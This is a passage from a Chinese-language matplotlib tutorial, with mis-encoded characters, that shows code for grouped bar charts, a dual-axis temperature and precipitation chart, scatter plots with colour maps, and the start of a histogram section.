    ax.text(xi, price + <span class="hljs-number">0.2</span>, <span class="hljs-string">f"<span class="hljs-subst">{price}</span>"</span>, 
            ha=<span class="hljs-string">"center"</span>,   <span class="hljs-comment"># æ°´å¹³å±…ä¸­</span>
            va=<span class="hljs-string">"bottom"</span>,   <span class="hljs-comment"># å‚ç›´åº•éƒ¨å¯¹é½</span>
            fontsize=<span class="hljs-number">12</span>)

<span class="hljs-comment"># è®¾ç½®axè¡¨çš„å¯è§è§†çª—å¤§å°ï¼Œxåœ¨0.2~5.8ä¹‹é—´ï¼Œyåœ¨0~7ä¹‹é—´ï¼Œä½ å¯ä»¥è‡ªå·±è°ƒæ•´ï¼Œçœ‹çœ‹æ•ˆæœ</span>
<span class="hljs-comment"># ä¸»è¦å°±æ˜¯è®©å›¾å½¢å‘¨å›´ç•™æœ‰ä¸€å®šç©ºé—´</span>
ax.set_ylim(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>)          <span class="hljs-comment"># yè½´æ˜¾ç¤º0~7</span>
ax.set_xlim(<span class="hljs-number">0.2</span>, <span class="hljs-number">5.8</span>)      <span class="hljs-comment"># xè½´æ˜¾ç¤º0.2~5.8ï¼ˆæŸ±å­å±…ä¸­ï¼‰</span>

<span class="hljs-comment"># æ·»åŠ å›¾ä¾‹ä¸ç½‘æ ¼</span>
ax.legend()
ax.grid(axis=<span class="hljs-string">"y"</span>, linestyle=<span class="hljs-string">"--"</span>, alpha=<span class="hljs-number">0.5</span>)

<span class="hljs-comment"># åœ¨axè¡¨ä¸Šç»§ç»­ç»˜åˆ¶æŠ˜çº¿å›¾ï¼Œä¸è¦å¿˜äº†ï¼Œmatplotlibä¸ä¼šæ“¦é™¤ä¹‹å‰ç»˜åˆ¶çš„ä»»ä½•å†…å®¹ï¼Œå› æ­¤ä½ å¯ä»¥ç»„åˆå‡ºå¾ˆå¤šå¥‡ç‰¹çš„å›¾</span>
ax.plot(x, wholesale_price,
        color=<span class="hljs-string">"#2E2E2E"</span>,
        linestyle=<span class="hljs-string">"--"</span>,
        alpha=<span class="hljs-number">0.5</span>,
        marker=<span class="hljs-string">"o"</span>)        <span class="hljs-comment"># æ•°æ®ç‚¹ç”¨åœ†åœˆæ ‡è®°</span>
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d027a5853e53410b9c10f0ea318f88a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=DiuyXZ6O20uh5bbq5W3BUEf5Zu8%3D" alt="c14.jpg" width="100%" loading="lazy"/></p>
<p>å…¶å®åˆ°è¿™é‡Œï¼Œæ¡å½¢å›¾å°±å·²ç»è®²å®Œäº†ï¼Œä½†æ˜¯åœ¨å®é™…åˆ†æä¸­ï¼Œæˆ‘ä»¬å¸¸éœ€è¦æ¯”è¾ƒåŒä¸€åˆ†ç±»ä¸‹å¤šä¸ªç³»åˆ—çš„æ•°æ®ï¼Œè¿™å°±æ˜¯å¤šç±»åˆ«æ¡å½¢å›¾ï¼ˆå›¾15ç±»å‹ï¼‰ï¼Œå…¶å®ä½ åœ¨å­¦ä¼šä¸Šé¢çš„å†…å®¹åï¼Œè‡ªç„¶è€Œç„¶å°±ä¼šç»˜åˆ¶å¤šç±»åˆ«æ¡å½¢å›¾äº†ï¼Œå®ƒçš„æœ¬è´¨å°±æ˜¯åœ¨ä¸€ä¸ªå›¾è¡¨ä¸Šç»˜åˆ¶å¤šä¸ªæ¡å½¢å›¾ï¼Œæ¥ä¸‹æ¥å°±å¸¦ä½ ç»˜åˆ¶ä¸€éå¦‚å›¾18æ‰€ç¤ºçš„å¤šç±»åˆ«æ¡å½¢å›¾ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">7</span>, <span class="hljs-number">4.5</span>))
ax.xaxis.set_minor_locator(AutoMinorLocator(<span class="hljs-number">5</span>))

<span class="hljs-comment"># ä¸‰ç§ä»·æ ¼æ•°æ®ï¼ˆå•ä½ï¼šå…ƒ/å…¬æ–¤ï¼‰</span>
wholesale_price = [<span class="hljs-number">5.1</span>, <span class="hljs-number">4.7</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">3.2</span>, <span class="hljs-number">4.3</span>]   <span class="hljs-comment"># æ‰¹å‘ä»·</span>
retail_price = [<span class="hljs-number">8.17</span>, <span class="hljs-number">9.74</span>, <span class="hljs-number">9.2</span>, <span class="hljs-number">8.58</span>, <span class="hljs-number">7.5</span>]    <span class="hljs-comment"># é›¶å”®ä»·</span>
online_price = [<span class="hljs-number">6.31</span>, <span class="hljs-number">6.42</span>, <span class="hljs-number">5.94</span>, <span class="hljs-number">7.35</span>, <span class="hljs-number">6.93</span>]  <span class="hljs-comment"># ç”µå•†ä»·</span>


categories = [<span class="hljs-string">"é¦™è•‰"</span>, <span class="hljs-string">"æ©™å­"</span>, <span class="hljs-string">"è‹¹æœ"</span>, <span class="hljs-string">"æ©˜å­"</span>, <span class="hljs-string">"æå­"</span>]
<span class="hljs-comment"># ç¡®å®šæ¯ä¸ªåˆ†ç±»çš„ä¸­å¿ƒä½ç½®ï¼ˆè¿™é‡Œä¸º[1, 2.5, 4, 5.5, 7]ï¼Œé—´è·ä¸º1.5ï¼‰</span>
x = [<span class="hljs-number">1</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">7</span>]

ax.set_xticks(x)
ax.set_xticklabels(categories)

<span class="hljs-comment"># ç¬¬ä¸€ç»„ï¼šé›¶å”®ä»·ï¼ˆå·¦ä¾§åç§»0.25ï¼‰</span>
ax.bar(
    [i - <span class="hljs-number">0.25</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x],  <span class="hljs-comment"># æ¨ªåæ ‡å·¦ç§»0.25</span>
    retail_price,
    width=<span class="hljs-number">0.5</span>,
    label=<span class="hljs-string">"é›¶å”®ä»·"</span>,
    color=<span class="hljs-string">"#C5C5C5"</span>,        <span class="hljs-comment"># æµ…ç°è‰²</span>
    edgecolor=<span class="hljs-string">"black"</span>,
    alpha=<span class="hljs-number">0.8</span>,
)

<span class="hljs-comment"># ç¬¬äºŒç»„ï¼šæ‰¹å‘ä»·ï¼ˆå±…ä¸­ï¼Œå®½åº¦è¾ƒçª„ï¼‰</span>
ax.bar(
    [i - <span class="hljs-number">0.25</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x],  <span class="hljs-comment"># ä¸é›¶å”®ä»·åŒä¸€åŸºå‡†ä½ç½®</span>
    wholesale_price,
    width=<span class="hljs-number">0.25</span>,             <span class="hljs-comment"># è¾ƒçª„çš„æŸ±å­</span>
    label=<span class="hljs-string">"æ‰¹å‘ä»·"</span>,
    color=<span class="hljs-string">"#555555"</span>,        <span class="hljs-comment"># ä¸­ç°è‰²</span>
)

<span class="hljs-comment"># ç¬¬ä¸‰ç»„ï¼šç”µå•†ä»·ï¼ˆå³ä¾§åç§»0.25ï¼‰</span>
ax.bar(
    [i + <span class="hljs-number">0.25</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x],  <span class="hljs-comment"># æ¨ªåæ ‡å³ç§»0.25</span>
    online_price,
    width=<span class="hljs-number">0.5</span>,
    label=<span class="hljs-string">"ç”µå•†ä»·"</span>,
    color=<span class="hljs-string">"#FFFFFF"</span>,        <span class="hljs-comment"># ç™½è‰²å¡«å……</span>
    edgecolor=<span class="hljs-string">"black"</span>,
    hatch=<span class="hljs-string">"///"</span>,            <span class="hljs-comment"># å¡«å……å›¾æ¡ˆï¼šæ–œçº¿</span>
)

<span class="hljs-comment"># è®¾ç½®åæ ‡è½´ä¸æ ‡é¢˜</span>
ax.set_ylim(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)
ax.set_xlim(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>)
ax.set_xlabel(<span class="hljs-string">"æ°´æœç§ç±»"</span>)
ax.set_ylabel(<span class="hljs-string">"ä»·æ ¼ï¼ˆå…ƒ/å…¬æ–¤ï¼‰"</span>)
ax.set_title(<span class="hljs-string">"ä¸åŒé”€å”®æ¸ é“çš„æ°´æœä»·æ ¼å¯¹æ¯”"</span>)
ax.legend()
ax.grid(axis=<span class="hljs-string">"y"</span>, linestyle=<span class="hljs-string">"--"</span>, alpha=<span class="hljs-number">0.5</span>)
</code></pre>
<p><strong>åç§»åŸç†</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªåˆ†ç±»çš„ä¸­å¿ƒä½ç½®ä¸º <code>x[i]</code></li>
<li>å·¦ä¾§æŸ±å­ï¼š<code>x[i] - offset</code></li>
<li>å³ä¾§æŸ±å­ï¼š<code>x[i] + offset</code></li>
<li>é€šè¿‡è°ƒæ•´ <code>width</code> å’Œ <code>offset</code> æ§åˆ¶æŸ±å­çš„å®½åº¦ä¸é—´è·</li>
</ul>
<p><strong>å›¾æ¡ˆå¡«å……</strong>ï¼š(è‡ªå·±å¤šå¤šå°è¯•å°±æ‡‚äº†)</p>
<ul>
<li><code>hatch</code> å‚æ•°æ”¯æŒå¤šç§å¡«å……æ¨¡å¼ï¼š<code>'/'</code>, <code>'\'</code>, <code>'|'</code>, <code>'-'</code>, <code>'+'</code>, <code>'x'</code>, <code>'o'</code>, <code>'O'</code>, <code>'.'</code>, <code>'*'</code></li>
<li>å›¾æ¡ˆå¯†åº¦ä¼šéšå­—ç¬¦é‡å¤è€Œå¢åŠ ï¼Œå¦‚ <code>'///'</code> æ¯” <code>'/'</code> æ›´å¯†é›†</li>
</ul>
<p>æœ€åï¼Œæˆ‘ä»¬ç»¼åˆè¿ç”¨å‰é¢å­¦åˆ°çš„çŸ¥è¯†ï¼Œå®Œæˆä¸€ä¸ªå…·æœ‰å®ç”¨ä»·å€¼çš„ç»„åˆå›¾ï¼ˆå›¾19ï¼‰ï¼šç»˜åˆ¶æŸåŸå¸‚çš„æ°”æ¸©æ›²çº¿å’Œé™æ°´é‡æŸ±çŠ¶å›¾ã€‚ï¼ˆä½ å¯ä»¥å…ˆè‡ªå·±å°è¯•ç»˜åˆ¶ä¸€ä¸‹ï¼Œè‹¥å‘ç°å“ªé‡Œæœ‰å¡ä½äº†å†çœ‹çœ‹å‚è€ƒä»£ç ï¼‰</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dce745d4bae64004bc768976322843d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=jDvQQ7O7A6OUb71t86OkZLFpxYs%3D" alt="c15.jpg" width="70%" loading="lazy"/></p>
<p><strong>å‚è€ƒä»£ç ï¼š</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
plt.rcParams[<span class="hljs-string">"font.sans-serif"</span>] = [<span class="hljs-string">"SimHei"</span>] 
plt.rcParams[<span class="hljs-string">"axes.unicode_minus"</span>] = <span class="hljs-literal">False</span>

<span class="hljs-comment"># æ•°æ®å‡†å¤‡</span>
month = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>]  <span class="hljs-comment"># æœˆä»½</span>
temperature = [<span class="hljs-number">16</span>, <span class="hljs-number">16.5</span>, <span class="hljs-number">17.5</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">24</span>, <span class="hljs-number">30</span>, <span class="hljs-number">32</span>, <span class="hljs-number">31</span>, <span class="hljs-number">26</span>, <span class="hljs-number">21</span>, <span class="hljs-number">18</span>]  <span class="hljs-comment"># æ°”æ¸©(â„ƒ)</span>
precipitation = [<span class="hljs-number">12</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">45</span>, <span class="hljs-number">79</span>, <span class="hljs-number">120</span>, <span class="hljs-number">140</span>, <span class="hljs-number">230</span>, <span class="hljs-number">180</span>, <span class="hljs-number">160</span>, <span class="hljs-number">153</span>, <span class="hljs-number">20</span>]  <span class="hljs-comment"># é™æ°´é‡(mm)</span>

fig, ax = plt.subplots(figsize=(<span class="hljs-number">5</span>, <span class="hljs-number">5.5</span>))

<span class="hljs-comment"># å·¦ä¾§yè½´ï¼šç»˜åˆ¶æ°”æ¸©æŠ˜çº¿å›¾</span>
ax.plot(
    month, temperature,
    color=<span class="hljs-string">"black"</span>,
    marker=<span class="hljs-string">"o"</span>, 
    markersize=<span class="hljs-number">5</span>,  
    markerfacecolor=<span class="hljs-string">"#292929"</span>,  <span class="hljs-comment"># æ ‡è®°ç‚¹å¡«å……è‰²</span>
    markeredgecolor=<span class="hljs-string">"#060504"</span>,  <span class="hljs-comment"># æ ‡è®°ç‚¹è¾¹æ¡†è‰²</span>
    markeredgewidth=<span class="hljs-number">1</span>,
)  
ax.set_xlabel(<span class="hljs-string">"æµ·å£"</span>, fontsize=<span class="hljs-number">14</span>) 
ax.set_ylabel(<span class="hljs-string">"æ°”æ¸©(â„ƒ)"</span>)
ax.set_xticks(month)
ax.set_ylim(-<span class="hljs-number">60</span>, <span class="hljs-number">40</span>)  <span class="hljs-comment"># ç•™å‡ºè¶³å¤Ÿç©ºé—´ï¼Œé¿å…æ¡å½¢å›¾æº¢å‡º</span>

<span class="hljs-comment"># åˆ›å»ºå³ä¾§yè½´ï¼ˆå…±äº«åŒä¸€xè½´ï¼‰</span>
sub_ax = ax.twinx()

<span class="hljs-comment"># åœ¨å³ä¾§yè½´åæ ‡ç³»ä¸­ç»˜åˆ¶é™æ°´é‡æ¡å½¢å›¾</span>
sub_ax.bar(
    month, precipitation,
    width=<span class="hljs-number">0.5</span>,
    edgecolor=<span class="hljs-string">"black"</span>,
    color=<span class="hljs-string">"#FFFFFF"</span>,
    alpha=<span class="hljs-number">1</span>,
    hatch=<span class="hljs-string">"///"</span>  <span class="hljs-comment"># ç”¨æ–œçº¿å¡«å……ï¼ŒåŒºåˆ«äºçº¯è‰²</span>
)
sub_ax.set_ylabel(<span class="hljs-string">"é™æ°´é‡(mm)"</span>)
sub_ax.set_ylim(<span class="hljs-number">0</span>, <span class="hljs-number">400</span>)  <span class="hljs-comment"># è®¾ç½®åˆé€‚çš„èŒƒå›´</span>

<span class="hljs-comment"># ä¸ºå³ä¾§yè½´æ·»åŠ ç½‘æ ¼çº¿ï¼ˆå¢å¼ºå¯è¯»æ€§ï¼‰</span>
sub_ax.grid(
    <span class="hljs-literal">True</span>,
    which=<span class="hljs-string">"both"</span>, 
    axis=<span class="hljs-string">"y"</span>,  
    linestyle=<span class="hljs-string">"-"</span>, 
    linewidth=<span class="hljs-number">0.5</span>,  
    color=<span class="hljs-string">"gray"</span>, 
    alpha=<span class="hljs-number">0.4</span>,  
)

plt.show()
</code></pre>
<h3 data-id="heading-13">äº”. æ•£ç‚¹å›¾</h3>
<p>æ•£ç‚¹å›¾æ˜¯ä¸€ç§å°†æˆå¯¹æ•°æ® <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span> ç»˜åˆ¶ä¸ºäºŒç»´å¹³é¢ä¸­ä¸€ä¸ªç‚¹çš„å¯è§†åŒ–æ–¹æ³•ã€‚é€šè¿‡è§‚å¯Ÿè¿™äº›ç‚¹çš„åˆ†å¸ƒå½¢æ€ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ç›´è§‚åœ°åˆ¤æ–­ä¸¤ä¸ªå˜é‡ä¹‹é—´æ˜¯å¦å­˜åœ¨ç›¸å…³æ€§ã€åˆ†å¸ƒæ¨¡å¼æˆ–å¼‚å¸¸å€¼</strong>ã€‚å› æ­¤ï¼Œæ•£ç‚¹å›¾åœ¨æ•°æ®åˆ†æã€æ¨¡å¼è¯†åˆ«å’Œåˆæ­¥æ¢ç´¢ä¸­æä¸ºå¸¸ç”¨ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç»˜åˆ¶ä¸€ä¸ªæœ€åŸºæœ¬çš„æ•£ç‚¹å›¾ï¼Œä»£ç å¦‚ä¸‹ï¼Œè¿è¡Œç»“æœå¦‚å›¾20æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">3.5</span>))

<span class="hljs-comment"># ç¬¬ä¸€ç»„æ•°æ®ç‚¹ï¼š(x1[i], y1[i])</span>
x1 = [<span class="hljs-number">1.2</span>, <span class="hljs-number">3.1</span>, <span class="hljs-number">1.8</span>, <span class="hljs-number">2.6</span>, <span class="hljs-number">3.1</span>, <span class="hljs-number">2.2</span>]
y1 = [<span class="hljs-number">2.5</span>, <span class="hljs-number">2.6</span>, <span class="hljs-number">1.8</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.0</span>, <span class="hljs-number">1.8</span>]

<span class="hljs-comment"># ç¬¬äºŒç»„æ•°æ®ç‚¹ï¼š(x2[i], y2[i])</span>
x2 = [<span class="hljs-number">2.1</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">2.8</span>, <span class="hljs-number">1.6</span>, <span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>]
y2 = [<span class="hljs-number">3.5</span>, <span class="hljs-number">3.1</span>, <span class="hljs-number">2.8</span>, <span class="hljs-number">3.6</span>, <span class="hljs-number">4.0</span>, <span class="hljs-number">2.8</span>]

<span class="hljs-comment"># ç»˜åˆ¶ç¬¬ä¸€ç»„æ•£ç‚¹</span>
ax.scatter(
    x1,
    y1,
    s=<span class="hljs-number">40</span>,              <span class="hljs-comment"># ç‚¹çš„å¤§å°</span>
    color=<span class="hljs-string">"#575757"</span>,   <span class="hljs-comment"># å¡«å……é¢œè‰²ï¼ˆç°è‰²ï¼‰</span>
    alpha=<span class="hljs-number">1</span>,           <span class="hljs-comment"># ä¸é€æ˜åº¦</span>
    edgecolors=<span class="hljs-string">"#000000"</span>,  <span class="hljs-comment"># è¾¹ç¼˜é¢œè‰²ï¼ˆé»‘è‰²ï¼‰</span>
    linewidths=<span class="hljs-number">1</span>,      <span class="hljs-comment"># è¾¹ç¼˜çº¿å®½</span>
    marker=<span class="hljs-string">"o"</span>,        <span class="hljs-comment"># ç‚¹å½¢çŠ¶ï¼ˆåœ†å½¢ï¼‰ï¼Œæ›´å¤šé€‰é¡¹å¯ä»¥æŸ¥çœ‹â€œ2.3åŸºç¡€æ ·å¼â€ä¸­çš„markeré€ŸæŸ¥è¡¨</span>
    label=<span class="hljs-string">"Group A"</span>,   <span class="hljs-comment"># å›¾ä¾‹æ ‡ç­¾</span>
)

<span class="hljs-comment"># ç»˜åˆ¶ç¬¬äºŒç»„æ•£ç‚¹</span>
ax.scatter(
    x2,
    y2,
    s=<span class="hljs-number">40</span>,
    color=<span class="hljs-string">"#FFFFFF"</span>,   <span class="hljs-comment"># å¡«å……é¢œè‰²ï¼ˆç™½è‰²ï¼‰</span>
    alpha=<span class="hljs-number">1</span>,
    edgecolors=<span class="hljs-string">"#000000"</span>,
    linewidths=<span class="hljs-number">1</span>,
    marker=<span class="hljs-string">"o"</span>,
    label=<span class="hljs-string">"Group B"</span>,
)

<span class="hljs-comment"># æ˜¾ç¤ºå›¾ä¾‹</span>
ax.legend()
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7eaa45dcbde34995a31a63dc148ddbf3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=P2h8iDXR2Q3iFYxxi%2FqmUIo2RTQ%3D" alt="c16.jpg" width="100%" loading="lazy"/></p>
<p>é€šè¿‡ä¸Šé¢çš„ä¾‹å­ï¼Œä½ å·²ç»å¯ä»¥ç”»å‡ºæ¸…æ™°çš„åˆ†ç±»æ•£ç‚¹å›¾ã€‚åœ¨å®é™…åˆ†æä¸­ï¼Œæˆ‘ä»¬æœ‰æ—¶è¿˜éœ€è¦ç”¨<strong>ç‚¹çš„å¤§å°æˆ–é¢œè‰²è¡¨ç¤ºç¬¬ä¸‰ä¸ªç»´åº¦</strong>çš„ä¿¡æ¯ï¼ˆä¾‹å¦‚æƒé‡ã€å¯†åº¦ã€ç±»åˆ«ç­‰ï¼‰ï¼Œéœ€è¦åšåˆ°ç²¾ç»†åŒ–å¤„ç†æ¯ä¸€ä¸ªç‚¹ï¼Œç»™æ¯ä¸ªç‚¹è®¾ç½®ä¸åŒçš„å¤§å°å’Œé¢œè‰²ï¼Œå®ç°èµ·æ¥ä¹Ÿéå¸¸ç®€å•ï¼Œè¦å®ç°å›¾21æ‰€ç¤ºçš„æ•ˆæœï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">7</span>, <span class="hljs-number">3.5</span>))

x1 = [<span class="hljs-number">1.2</span>, <span class="hljs-number">3.1</span>, <span class="hljs-number">1.8</span>, <span class="hljs-number">2.6</span>, <span class="hljs-number">3.1</span>, <span class="hljs-number">2.2</span>]
y1 = [<span class="hljs-number">2.5</span>, <span class="hljs-number">2.6</span>, <span class="hljs-number">1.8</span>, <span class="hljs-number">2.2</span>, <span class="hljs-number">3.0</span>, <span class="hljs-number">1.8</span>]

<span class="hljs-comment"># æ¯ä¸ªç‚¹çš„å¤§å°</span>
sizes = [<span class="hljs-number">40</span>, <span class="hljs-number">60</span>, <span class="hljs-number">90</span>, <span class="hljs-number">100</span>, <span class="hljs-number">120</span>, <span class="hljs-number">140</span>]

<span class="hljs-comment"># æ¯ä¸ªç‚¹çš„é¢œè‰²å€¼ï¼Œç”¨ä¸€ä¸ª 0~1 çš„æµ®ç‚¹æ•°è¡¨ç¤ºï¼Œå¯¹åº”é¢œè‰²æ˜ å°„è¡¨ä¸­çš„ä½ç½®</span>
colors = [<span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.3</span>, <span class="hljs-number">0.4</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">1</span>]

<span class="hljs-comment"># ç»˜åˆ¶å¸¦é¢œè‰²æ˜ å°„çš„æ•£ç‚¹å›¾</span>
scatter = ax.scatter(
    x1,
    y1,
    s=sizes,        <span class="hljs-comment"># ä½¿ç”¨åˆ—è¡¨åˆ†åˆ«æŒ‡å®šæ¯ä¸ªç‚¹çš„å¤§å°</span>
    c=colors,       <span class="hljs-comment"># ä½¿ç”¨åˆ—è¡¨åˆ†åˆ«æŒ‡å®šæ¯ä¸ªç‚¹çš„é¢œè‰²å€¼</span>
    cmap=<span class="hljs-string">"plasma"</span>,  <span class="hljs-comment"># é¢œè‰²æ˜ å°„è¡¨ï¼Œå°† 0~1 çš„å€¼æ˜ å°„ä¸ºå…·ä½“é¢œè‰²</span>
    alpha=<span class="hljs-number">0.8</span>,      <span class="hljs-comment"># ä¸é€æ˜åº¦</span>
    linewidths=<span class="hljs-number">0</span>,   <span class="hljs-comment"># è¾¹ç¼˜çº¿å®½ï¼ˆè®¾ä¸º 0 è¡¨ç¤ºæ— è¾¹æ¡†ï¼‰</span>
    marker=<span class="hljs-string">"o"</span>,     <span class="hljs-comment"># ç‚¹å½¢çŠ¶</span>
)

<span class="hljs-comment"># æ·»åŠ é¢œè‰²æ˜ å°„æ¡ï¼ˆcolorbarï¼‰</span>
cbar = fig.colorbar(scatter, ax=ax)
<span class="hljs-comment"># å¯è®¾ç½®é¢œè‰²æ¡æ ‡é¢˜ï¼ˆæŒ‰éœ€å¯ç”¨ï¼‰</span>
cbar.set_label(<span class="hljs-string">"é¢œè‰²æ˜ å°„æ¡æ ‡é¢˜"</span>, fontsize=<span class="hljs-number">9</span>)

<span class="hljs-comment"># è®¾å®šåæ ‡è½´èŒƒå›´ï¼Œè®©å›¾å½¢æ›´ç¾è§‚</span>
ax.set_xlim(<span class="hljs-number">0.6</span>, <span class="hljs-number">3.6</span>)
ax.set_ylim(<span class="hljs-number">1</span>, <span class="hljs-number">3.7</span>)
</code></pre>
<p>å¸¸ç”¨çš„ <code>cmap</code>ï¼ˆé¢œè‰²æ˜ å°„ï¼‰é€‰é¡¹åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>è¿ç»­å‹</strong>ï¼š<code>plasma</code>ã€<code>viridis</code>ã€<code>coolwarm</code>ã€<code>hot</code>ã€<code>gray</code>ï¼ˆé€‚åˆè¡¨ç¤ºæ•°å€¼å¤§å°ï¼‰</li>
<li><strong>ç¦»æ•£å‹</strong>ï¼š<code>tab10</code>ã€<code>Set2</code>ï¼ˆé€‚åˆè¡¨ç¤ºåˆ†ç±»ï¼‰</li>
</ul>
<p>è¿™äº›é¢œè‰²æ˜ å°„çš„è§†è§‰å¯¹æ¯”å¦‚å›¾22æ‰€ç¤ºï¼Œä½ å¯ä»¥æ ¹æ®æ•°æ®ç‰¹æ€§é€‰æ‹©æœ€åˆé€‚çš„æ˜ å°„æ–¹æ¡ˆã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abf146f809a549ca9076dadb47581160~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=R%2B0kktm11I0rQppES89Joq%2FN7c8%3D" alt="c17.jpg" width="100%" loading="lazy"/></p>
<h3 data-id="heading-14">å…­. ç›´æ–¹å›¾</h3>
<p>ç›´æ–¹å›¾ï¼ˆHistogramï¼‰æ˜¯ä¸€ç§ç”¨äºå±•ç¤ºæ•°æ®åˆ†å¸ƒæƒ…å†µçš„ç»Ÿè®¡å›¾è¡¨ï¼Œå®ƒé€šè¿‡å°†æ•°æ®åˆ’åˆ†åˆ°ä¸åŒçš„åŒºé—´ï¼ˆç§°ä¸ºâ€œç®±â€æˆ–â€œbinâ€ï¼‰ï¼Œå¹¶ç»Ÿè®¡æ¯ä¸ªåŒºé—´å†…æ•°æ®ç‚¹çš„æ•°é‡æ¥ç»˜åˆ¶ã€‚ç›´æ–¹å›¾ç‰¹åˆ«é€‚åˆè§‚å¯Ÿæ•°æ®çš„æ•´ä½“åˆ†å¸ƒã€é›†ä¸­è¶‹åŠ¿å’Œç¦»æ•£ç¨‹åº¦ã€‚</p>
<p>ä¸ºäº†è®©ä½ æ›´ç›´è§‚åœ°ç†è§£ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªç”Ÿæ´»ä¸­çš„ä¾‹å­æ¥è¯´æ˜ï¼šå‡è®¾ä½ æœ‰ä¸€æ‰€åˆä¸­æ‰€æœ‰å­¦ç”Ÿçš„èº«é«˜æ•°æ®ï¼Œç°åœ¨ä½ æƒ³çŸ¥é“èº«é«˜åœ¨ 1.45â€¯mâ€“1.50â€¯m ä¹‹é—´æœ‰å¤šå°‘äººã€1.50â€¯mâ€“1.55â€¯m ä¹‹é—´æœ‰å¤šå°‘äººâ€¦â€¦ä»¥æ­¤ç±»æ¨ã€‚å¦‚æœä½ æ‰‹åŠ¨ç»Ÿè®¡æ¯ä¸ªåŒºé—´çš„äººæ•°ï¼Œå†ç”¨æ¡å½¢å›¾ç”»å‡ºæ¥ï¼Œå½“ç„¶å¯ä»¥ï¼Œä½†è¿™æ ·åšæ¯”è¾ƒç¹çã€‚è€Œç›´æ–¹å›¾æ­£æ˜¯ä¸ºè¿™ç§â€œåˆ†æ®µç»Ÿè®¡â€ä»»åŠ¡è€Œç”Ÿçš„å·¥å…·ï¼Œå®ƒèƒ½è‡ªåŠ¨å®Œæˆåˆ†ç®±å’Œè®¡æ•°ï¼Œå¹¶ç›´æ¥ç”Ÿæˆå¯è§†åŒ–çš„åˆ†å¸ƒå›¾ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€æ®µåŸºç¡€çš„ç›´æ–¹å›¾ç»˜åˆ¶ä»£ç ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ç»„æ¨¡æ‹Ÿæ•°æ®æ¥æ¼”ç¤ºï¼š</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))
<span class="hljs-comment"># æ¨¡æ‹Ÿæ•°æ®</span>
